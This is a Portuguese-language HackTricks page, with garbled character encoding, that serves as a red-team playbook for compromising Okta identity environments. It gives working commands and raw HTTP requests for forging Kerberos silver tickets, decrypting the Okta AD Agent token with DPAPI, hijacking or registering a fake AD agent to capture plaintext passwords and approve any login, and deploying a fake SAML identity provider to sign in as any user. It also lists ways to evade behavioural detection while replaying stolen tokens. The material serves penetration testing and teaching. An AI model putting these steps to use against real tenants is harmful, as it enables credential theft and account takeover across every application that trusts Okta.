# Seguran√ßa do Okta

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou se quiser acessar a **vers√£o mais recente do PEASS ou baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Obtenha o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>

## Informa√ß√µes b√°sicas

A Okta, Inc. √© uma empresa de **gerenciamento de identidade e acesso** que fornece software em nuvem para ajudar empresas a **gerenciar e proteger a autentica√ß√£o do usu√°rio em aplicativos modernos**, e para desenvolvedores constru√≠rem controles de identidade em aplicativos, servi√ßos web e dispositivos.

Seu servi√ßo principal, chamado Okta Identity Cloud, oferece produtos que incluem autentica√ß√£o √∫nica (SSO), autentica√ß√£o multifator (MFA), gerenciamento do ciclo de vida, diret√≥rio universal, gerenciamento de acesso a API e muito mais. Isso ajuda as empresas a proteger seus dados sens√≠veis e tamb√©m a simplificar o acesso do usu√°rio, tornando os aplicativos e servi√ßos mais acess√≠veis e f√°ceis de usar para funcion√°rios ou clientes.

Os servi√ßos da Okta s√£o amplamente utilizados em contextos empresariais, bem como por empresas menores e desenvolvedores. Ela desempenha um papel crucial ao permitir que as empresas adotem e gerenciem com seguran√ßa as tecnologias em nuvem. At√© o meu conhecimento atualizado em setembro de 2021, a Okta continua sendo um jogador significativo na ind√∫stria de Gerenciamento de Identidade e Acesso (IAM).

{% hint style="danger" %}
O principal objetivo da Okta √© configurar o acesso de diferentes usu√°rios e grupos a aplicativos externos. Se voc√™ conseguir **comprometer privil√©gios de administrador em um ambiente Okta**, provavelmente conseguir√° **comprometer todas as outras plataformas que a empresa est√° usando**.
{% endhint %}

{% hint style="success" %}
Para realizar uma revis√£o de seguran√ßa de um ambiente Okta, voc√™ deve solicitar acesso **somente leitura de administrador**.
{% endhint %}

### Resumo

Existem **usu√°rios** (que podem ser **armazenados no Okta**, logados a partir de **Provedores de Identidade** configurados ou autenticados via **Active Directory** ou LDAP). \
Esses usu√°rios podem estar dentro de **grupos**.\
Existem tamb√©m **autenticadores**: diferentes op√ß√µes de autentica√ß√£o como senha e v√°rias op√ß√µes de autentica√ß√£o de dois fatores, como WebAuthn, e-mail, telefone, okta verify (eles podem estar habilitados ou desabilitados)...

Em seguida, existem **aplicativos** sincronizados com o Okta. Cada aplicativo ter√° algum **mapeamento com o Okta** para compartilhar informa√ß√µes (como endere√ßos de e-mail, nomes...). Al√©m disso, cada aplicativo deve estar dentro de uma **Pol√≠tica de Autentica√ß√£o**, que indica os **autenticadores necess√°rios** para que um usu√°rio acesse o aplicativo.

{% hint style="danger" %}
O papel mais poderoso √© o de **Super Administrador**.

Se um invasor comprometer o Okta com acesso de Administrador, todos os **aplicativos que confiam no Okta** provavelmente ser√£o **comprometidos**.
{% endhint %}

## Ataques

### Localizando o Portal do Okta

Normalmente, o portal de uma empresa estar√° localizado em **nomedaempresa.okta.com**. Se n√£o for esse o caso, tente **varia√ß√µes** simples do **nomedaempresa**. Se voc√™ n√£o conseguir encontrar, tamb√©m √© poss√≠vel que a organiza√ß√£o tenha um registro **CNAME** como **`okta.nomedaempresa.com`** apontando para o **portal do Okta**.

### Login no Okta via Kerberos

(Ataque copiado [**daqui**](https://trustedsec.com/blog/okta-for-red-teamers)).

Se existir um dom√≠nio como **`nomedaempresa.kerberos.okta.com`**, ent√£o o Kerberos est√° configurado dentro da empresa para acessar o Okta. Isso √© muito interessante, pois geralmente os usu√°rios do Windows n√£o precisar√£o de MFA para acessar o Okta.

Tamb√©m √© poss√≠vel encontrar usu√°rios Kerberos configurados com acesso ao Okta dentro do ambiente AD em execu√ß√£o:
```bash
getST.py -spn HTTP/clientname.kerberos.okta.com -dc-ip 1.2.3.4 LAB/comprommiseduser
```
Com um ticket recuperado para o usu√°rio AD, precisamos injet√°-lo em um host que controlamos usando o Rubeus ou o Mimikatz:

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Voc√™ precisa garantir que `clientname.kerberos.okta.com` seja adicionado √† zona de seguran√ßa "Intranet" nas Op√ß√µes da Internet. Em seguida, em nosso navegador, se acessarmos a URL abaixo, dever√≠amos receber uma resposta JSON fornecendo um resultado `OK` quando o ticket Kerberos for aceito:

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

Ao acessar o painel do Okta, se tudo estiver OK, voc√™ estar√° conectado.

Al√©m disso, se conseguirmos comprometer a conta de servi√ßo real do Okta expondo o SPN de delega√ß√£o, podemos realizar um ataque de Silver Ticket.

Deve-se observar que, como o Okta suporta apenas AES para criptografia de tickets, precisaremos garantir que tenhamos a chave AES ou a senha em texto simples para autentica√ß√£o:

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Para criar nosso ticket para o usu√°rio v√≠tima `testuser`, usamos:

{% code overflow="wrap" %}
```bash
ticketer.py -domain-sid S-1-5-21-4170871944-1575468979-147100471 -domain lab.local -dc-ip DC01 -aesKey db22ab9c89f2f0d545024f9dfabbed44173397065d8f5b7e172200ca38ed4393 -user-id 1118 -spn HTTP/example.kerberos.okta.com testuser
```
{% endcode %}

E novamente, envie isso para o Okta por meio de nossa sess√£o do navegador:

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

### Sequestrando o Agente AD do Okta

(Ataque copiado [**daqui**](https://trustedsec.com/blog/okta-for-red-teamers)).

Se voc√™ acessar um servidor executando o Agente AD do Okta. Esse agente √© respons√°vel por sincronizar usu√°rios e grupos de dom√≠nio para o Okta para provisionamento, e tamb√©m responder a solicita√ß√µes de autentica√ß√£o do Okta √† medida que os usu√°rios fazem login no portal.

Por padr√£o, o agente √© instalado em:
```bash
C:\Program Files (x86)\Okta\Okta AD Agent
```
Vamos dar uma olhada no `OktaAgentService.exe.config`, que cont√©m algumas partes interessantes de XML:

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

O `AgentToken` codificado em Base64 √© onde focamos nossa aten√ß√£o. Se abrirmos o `OktaAgentService.exe` no dnSpy, podemos ver como esses valores s√£o descriptografados:

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Isso mesmo.. bom e velho DPAPI! O valor `RandomEntropy` √© definido como:

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

Isso significa que podemos descriptografar esse valor XML codificado em Base64 usando:
```powershell
Add-Type -AssemblyName 'System.Security'
$rand = [byte]174,53,167,191,10,250,125,232,223,147,248,86,65

$k = [System.Security.Cryptography.ProtectedData]::Unprotect([System.Convert]::FromBase64String("AQAAANCMnd8BFdERjH..."), $rand, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
[System.Text.Encoding]::Unicode.GetString($k)
```
A chave mestra DPAPI usada pertence √† conta de usu√°rio que executa o servi√ßo "Okta AD Agent", portanto, voc√™ precisar√° executar o comando acima no contexto da conta de servi√ßo ou obter a chave mestra da conta e descriptograf√°-la:

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

Por exemplo, dentro do arquivo `OktaAgentService.exe.config`, temos mais dois campos XML, `APPID` e `AGENTID`. Combinados com o `AgentToken`, podemos fazer uma solicita√ß√£o `GET` da seguinte forma:
```xml
GET /api/1/internal/app/activedirectory/[APPID]/agent/[AGENTID]/nextAction?agentVersion=1&pollid=anything HTTP/1.1
Host: client.okta.com
Authorization: SSWS 00OfIl_Gi1rZu1NETmHo6auU6YZEOEn8ZlDhyqstiZ
```
Esta chamada ir√° bloquear at√© que um usu√°rio se autentique no Okta (ou a solicita√ß√£o expire), caso em que retornar√° o pr√≥ximo nome de usu√°rio e senha fornecidos em texto claro:
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<action>
<UserAuth actionId="rpc::app.active_directory.agent.reply.ok14-majorecs02a.auw2-ok14.internal//1670637714886//Y5PojoeQQ3KDgHHzA11P9wAAC8g:e9088489-99ff-435a-943b-b7dccc457cb5:">
<type>USER_AUTH</type>
<password>abc123</password>
<useLdapGroupPasswordPolicy>false</useLdapGroupPasswordPolicy>
<userName>domuser@lab.local</userName>
</UserAuth>
</action>
```
Embora isso permita capturar credenciais, tamb√©m temos a oportunidade de responder a essa tentativa de autentica√ß√£o se quisermos fazer algo como fornecer uma chave mestra. Fazemos isso emitindo a seguinte solicita√ß√£o HTTP:
```xml
POST /api/1/internal/app/activedirectory/0oa7c027u2tcjxoki697/agent/a537ca54okqfsuu0s697/actionResult?responseid=12345 HTTP/1.1
Host: client.okta.com
Authorization: SSWS 00JFtjd...WgkeI1Eg5Y
Content-Type: application/xml; charset=utf-8
Content-Length: 1362

<agentActionResult xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" actionId="rpc::app.active_directory.agent.reply.ok14-majorecs04a.auw2-ok14.internal//1694301421033//ZPz86MzEBzhpMhSFWzyK5wAAA_Q:440a7d52-704b-4c1b-ac79-afdc241e3080:">
<type>USER_AUTH</type>
<status>SUCCESS</status>
<message></message>
<errorCode></errorCode>
<timestamps>
<actionRecieivedFromOkta>1694358076</actionRecieivedFromOkta>
<actionSentToLdapServer>1694358076</actionSentToLdapServer>
<responseReceivedFromLdapServer>1694358076</responseReceivedFromLdapServer>
<responseSentToOkta>1694358076</responseSentToOkta>
<actionReceivedFromOktaMilliseconds>20230910150116.726Z</actionReceivedFromOktaMilliseconds>
<actionSentToLdapServerMilliseconds>20230910150116.741Z</actionSentToLdapServerMilliseconds>
<responseReceivedFromLdapServerMilliseconds>20230910150116.741Z</responseReceivedFromLdapServerMilliseconds>
<responseSentToOktaMilliseconds>20230910150116.741Z</responseSentToOktaMilliseconds>
</timestamps>
<additionalInfo>{{"ExecutionTime":"12","AgentUpTime":"0 day(s) 22:41:49","DC":"DC01.lab.local","DomainControllerFunctionality":"WIN2016","DomainFunctionality":"WIN2016","ForestFunctionality":"WIN2016","LdapResponseTime":"0"}}</additionalInfo>
</agentActionResult>
```
O resultado de emitir esta solicita√ß√£o √© permitir a autentica√ß√£o para qualquer usu√°rio via Okta.

### Sequestrando o AD como um Administrador

(Ataque copiado [**daqui**](https://trustedsec.com/blog/okta-for-red-teamers)).

Sabemos que podemos sequestrar um Agente AD do Okta usando um Token de Agente roubado, mas e se tivermos comprometido uma conta privilegiada do Okta e quisermos fazer isso sem um token de agente existente? Vamos ver como fazer isso.

Primeiro, precisamos criar um token de API do Agente AD do Okta. Para iniciar o fluxo de autentica√ß√£o, precisamos de um C√≥digo OAuth. Para obter isso, come√ßamos indo para:

{% code overflow="wrap" %}
```
https://example.okta.com/oauth2/authorize?redirect_uri=%2Foauth-response&response_type=code&client_id=cappT0Hfy97F1BoO1UTR&prompt=select_account
```
{% endcode %}

Isso ir√° exibir uma solicita√ß√£o de permiss√£o para voc√™ aceitar:

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

Aceitar a solicita√ß√£o apresentada ir√° redirecion√°-lo para `/oauth-response` junto com um par√¢metro `code`:

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

Precisamos pegar esse par√¢metro `code` e solicitar um token de API usando a solicita√ß√£o POST:
```
POST /oauth2/token HTTP/1.1
User-Agent: Okta AD Agent/3.16.0 (Microsoft Windows NT 6.2.9200.0; .NET CLR 4.0.30319.42000; 64-bit OS; 64-bit Process; sslpinning=disabled)
Content-Type: application/x-www-form-urlencoded
Host: example.okta.com
Content-Length: 65
Expect: 100-continue
Accept-Encoding: gzip, deflate
Connection: Keep-Alive

grant_type=api_token&code=7vzn01sl&client_id=cappT0Hfy97F1BoO1UTR
```
A resposta nos retorna nosso token de API:
```
{"api_token":"00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd"}
```
Usando este token, precisamos associ√°-lo a um dom√≠nio AD ativo. Fazemos isso usando a chamada de API:
```
POST /api/1/internal/app/activedirectory/ HTTP/1.1
User-Agent: Okta AD Agent/3.16.0 (Microsoft Windows NT 6.2.9200.0; .NET CLR 4.0.30319.42000; 64-bit OS; 64-bit Process; sslpinning=disabled)
Host: example.okta.com
Accept: application/xml; charset=UTF-8
Content-Type: application/xml; charset=UTF-8
Content-Length: 86
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<domain name="lab.local" />
```
Isso nos retornar√° a seguinte resposta XML, onde precisamos manter o valor do atributo `id` para uso posterior.
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<activeDirectory id="0oa4jsza16ar1UdaW696">
<name>lab.local</name>
<newInstance>false</newInstance>
</activeDirectory>
```
Em seguida, fazemos uma chamada de API HTTP para nomear nosso conector:
```
POST /api/1/internal/app/activedirectory/0oa4jsza16ar1UdaW196/agent?name=DC02 HTTP/1.1
Host: example.okta.com
Content-Type: text/xml
Content-Length: 0
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd
```
Isso retornar√° uma resposta XML onde novamente precisamos manter o atributo `id`:

{% code overflow="wrap" %}
```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?><agent id="a532camqiqXMhlOf5697"><name>DC02</name></agent>
```
{% endcode %}

Finalmente, inicializamos a conex√£o para permitir a recep√ß√£o de dados:
```xml
POST /api/1/internal/app/activedirectory/0oa4jsza16ar1UdaW196/agent/a532camqiqXMhlOf5697/actionResult?agentVersion=3.13.0.0 HTTP/1.1
Host: example.okta.com
Content-Type: text/xml
Content-Length: 825
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd

<agentActionResult xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<type>INIT</type>
<status>SUCCESS</status>
<timestamps>
<actionRecieivedFromOkta />
<actionSentToLdapServer />
<responseReceivedFromLdapServer />
<responseSentToOkta>1694304008</responseSentToOkta>
<actionReceivedFromOktaMilliseconds>00010101000000.000Z</actionReceivedFromOktaMilliseconds>
<actionSentToLdapServerMilliseconds>00010101000000.000Z</actionSentToLdapServerMilliseconds>
<responseReceivedFromLdapServerMilliseconds>00010101000000.000Z</responseReceivedFromLdapServerMilliseconds>
<responseSentToOktaMilliseconds>20230910000008.174Z</responseSentToOktaMilliseconds>
</timestamps>
<additionalInfo>{}</additionalInfo>
</agentActionResult>
```
Com isso feito, nosso agente AD falso est√° pronto e processar√° as tentativas de autentica√ß√£o conforme mostrado anteriormente.

Obviamente, n√£o queremos fazer tudo isso usando o Burp, ent√£o uma ferramenta foi criada para suportar alguns casos de uso. Ela est√° dispon√≠vel [aqui](https://github.com/xpn/OktaPostExToolkit).

O primeiro modo em que podemos executar essa ferramenta √© o modo `token`, que recebe um valor de Token de Agente comprometido e se conectar√° √† API do Okta, extraindo quaisquer credenciais que receber:

{% code overflow="wrap" %}
```bash
python ./main.py --tenant-domain example.okta.com --skeleton-key WibbleWobble99 token --api-token 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd --app-id 0oa7c027u2TcJxoki697 --agent-id a537cnm9ldwPILkqP697
```
Exemplos em v√≠deo:

* [https://www.youtube.com/watch?v=ZYRcfj6jtaA](https://www.youtube.com/watch?v=ZYRcfj6jtaA)
* [https://youtu.be/Sob2u6xEjTE](https://youtu.be/Sob2u6xEjTE)

A ferramenta tamb√©m permite registrar um novo conector AD se tivermos credenciais administrativas dispon√≠veis para um usu√°rio Okta que esteja usando:
```bash
python ./main.py --tenant-domain example.okta.com --skeleton-key WibbleWobble99 oauth --machine-name DC01 --windows-domain lab.local --code OAUTH_CODE_HERE
```
{% endcode %}

### Provedor Falso de SAML do Okta

(Ataque copiado [**daqui**](https://trustedsec.com/blog/okta-for-red-teamers)).

Outra t√©cnica que tem sido muito √∫til durante as avalia√ß√µes √© a implanta√ß√£o de um provedor falso de SAML.

Recentemente, o Okta forneceu [uma atualiza√ß√£o de seguran√ßa](https://sec.okta.com/articles/2023/08/cross-tenant-impersonation-prevention-and-detection) sobre ataques em andamento usando essa t√©cnica, portanto, √© certamente √∫til saber sobre isso ao simular atividades em um ambiente, especialmente para clientes que desejam testar suas detec√ß√µes desse ataque espec√≠fico.

Se tivermos acesso a uma conta Okta elevada, podemos implantar um Provedor de Identidade externo como parte da funcionalidade do Okta. Isso permite que provedores externos, como o Entra ID, concluam a autentica√ß√£o antes de redirecionar o usu√°rio para o Okta para selecionar aplicativos integrados.

Mas o que acontece se controlarmos o IDP? Bem, √© razo√°vel supor que, nesse caso, podemos aprovar qualquer solicita√ß√£o de autentica√ß√£o que desejarmos.

Para testar isso, precisamos implantar um Provedor de Identidade personalizado. Um IDP SAML muito prec√°rio que suporta nossas atividades nefastas pode ser encontrado [aqui](https://github.com/xpn/OktaPostExToolkit). A ideia principal por tr√°s dessa ferramenta √© nos permitir emitir respostas de autentica√ß√£o SAML assinadas que correspondam a qualquer usu√°rio que desejarmos.

Este servidor ouvir√° as solicita√ß√µes HTTP recebidas em `/saml`, ent√£o primeiro precisamos implantar um IDP no Okta.

Primeiro, selecionamos o IDP SAML 2.0:

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Ao configurar o IDP, precisamos prestar aten√ß√£o em algumas configura√ß√µes. A primeira √© o `Nome`, que √© o nome amig√°vel a ser mostrado para outros administradores do Okta.

Em seguida, est√° a URL do emissor, que deve ser definida como o valor de um identificador no formato URI. Isso tamb√©m pode ser qualquer coisa, mas usaremos `https://www.example.com/`.

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

Tamb√©m precisamos definir o campo `URL de Logon √önico do IdP` para o local onde nosso servidor SAML est√° sendo executado. Agora, a coisa legal √© que ISSO N√ÉO precisa ser uma URL que aponte para nosso servidor. Acho que vale a pena mencionar isso porque podemos ser bastante criativos na URL que inserimos aqui e dificultar um pouco o trabalho da Equipe Azul. Por exemplo, podemos definir esse campo como algo como `https://idp.google.com/saml` se quisermos, e a √∫nica coisa que precisamos fazer √© capturar a solicita√ß√£o SAML recebida. Aqui est√° a coisa legal: a solicita√ß√£o SAML √© encaminhada do lado do cliente. Com isso, quero dizer que o Okta gerar√° a `AuthRequest` SAML e far√° com que nosso navegador seja redirecionado para `https://idp.google.com/` juntamente com a solicita√ß√£o SAML. Isso, √© claro, significa que podemos simplesmente modificar o arquivo hosts local para apontar `idp.google.com` para `127.0.0.1`:
```bash
echo '127.0.0.1 idp.google.com' | sudo tee -a /etc/hosts
```
Tamb√©m precisamos de um certificado de assinatura que controlamos. Isso pode ser autoassinado e gerado usando o OpenSSL com:

{% code overflow="wrap" %}
```bash
openssl req -x509 -newkey rsa:2048 -sha256 -days 365 -nodes -keyout example.com.key -out example.com.crt
```
{% endcode %}

Novamente, voc√™ pode ser criativo com isso, pois n√£o h√° requisitos espec√≠ficos em rela√ß√£o √† autenticidade deste certificado.

Depois que a chave for gerada, basta fazer o upload do certificado para o Okta e criar nosso IDP.

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Por fim, precisamos garantir que `Match Against` esteja definido como `Okta Username or Email` e `Account Link Policy` esteja definido como `Automatic` para nos permitir autenticar em contas Okta existentes:

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

Com tudo salvo, precisamos baixar os Metadados:

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Em seguida, para iniciar a solicita√ß√£o de autentica√ß√£o e emitir o `AuthRequest`, navegamos para a URL mostrada em `Assertion Consumer Service URL`:

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

Ao navegar para esta URL, somos redirecionados para nosso servidor SAML interno:

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

Se fornecermos um endere√ßo de e-mail, descobrimos que podemos autenticar como qualquer usu√°rio Okta sem precisar saber suas credenciais.

Vamos ver isso em a√ß√£o em [https://youtu.be/uw1hlKNDG2c](https://youtu.be/uw1hlKNDG2c)

### Phishing no Portal Okta com o Evilgnix

Neste [**post do blog**](https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23), √© explicado como preparar uma campanha de phishing contra um portal Okta.

### Ataque de Impersona√ß√£o de Colega

Os **atributos que cada usu√°rio pode ter e modificar** (como e-mail ou nome) podem ser configurados no Okta. Se um **aplicativo** est√° **confiando** em um **atributo** como ID que o usu√°rio pode **modificar**, ele poder√° **se passar por outros usu√°rios nessa plataforma**.

Portanto, se o aplicativo est√° confiando no campo **`userName`**, provavelmente voc√™ n√£o poder√° alter√°-lo (porque geralmente n√£o √© poss√≠vel alterar esse campo), mas se ele estiver confiando, por exemplo, no campo **`primaryEmail`**, voc√™ poder√° **alter√°-lo para o endere√ßo de e-mail de um colega** e se passar por ele (voc√™ precisar√° ter acesso ao e-mail e aceitar a altera√ß√£o).

Observe que essa impersona√ß√£o depende de como cada aplicativo foi configurado. Apenas aqueles que confiam no campo que voc√™ modificou e aceitam atualiza√ß√µes ser√£o comprometidos.\
Portanto, o aplicativo deve ter esse campo habilitado, se existir:

<figure><img src="../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

Tamb√©m vi outros aplicativos que eram vulner√°veis, mas n√£o tinham esse campo nas configura√ß√µes do Okta (no final, diferentes aplicativos s√£o configurados de maneira diferente).

A melhor maneira de descobrir se voc√™ pode se passar por algu√©m em cada aplicativo √© tentar!

## Evitando pol√≠ticas de detec√ß√£o comportamental <a href="#9fde" id="9fde"></a>

A menos que seja divulgado antecipadamente, voc√™ provavelmente n√£o saber√° se as pol√≠ticas de detec√ß√£o comportamental foram implementadas at√© encontr√°-las. Uma **poss√≠vel maneira de contornar as pol√≠ticas de detec√ß√£o comportamental do Okta** √© simplesmente **evitar o painel principal do Okta** e direcionar diretamente as aplica√ß√µes do Okta (essas seriam as aplica√ß√µes na captura de tela acima que est√£o obscurecidas por caixas vermelhas). Se voc√™ possui um token de acesso Okta, em vez de reproduzir o token na p√°gina de login principal do Okta da empresa-alvo, voc√™ reproduzir√° o token na URL espec√≠fica da aplica√ß√£o do Okta.

Outras recomenda√ß√µes s√£o:

* Tenha cuidado ao reproduzir tokens de acesso capturados de proxies anonimizadores populares e servi√ßos de VPN.
* Ao reproduzir um token de acesso, use a mesma string de agente do usu√°rio usada pelo cliente.
* Tenha cuidado ao reproduzir tokens de acesso capturados de usu√°rios separados do mesmo endere√ßo IP.
* Tenha cuidado ao reproduzir tokens de acesso capturados no painel do Okta.
* Se voc√™ conhece os endere√ßos IP das empresas que as v√≠timas estar√£o usando, considere bloquear todo o tr√°fego que n√£o seja desse IP ou faixa de IP.

## Refor√ßo do Okta

O Okta possui muitas configura√ß√µes poss√≠veis, nesta p√°gina voc√™ encontrar√° como revis√°-las para que sejam o mais seguras poss√≠vel:

{% content-ref url="okta-hardening.md" %}
[okta-hardening.md](okta-hardening.md)
{% endcontent-ref %}

## Refer√™ncias

* [https://trustedsec.com/blog/okta-for-red-teamers](https://trustedsec.com/blog/okta-for-red-teamers)
* [https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23](https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23)

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou se quiser acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) **e do** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
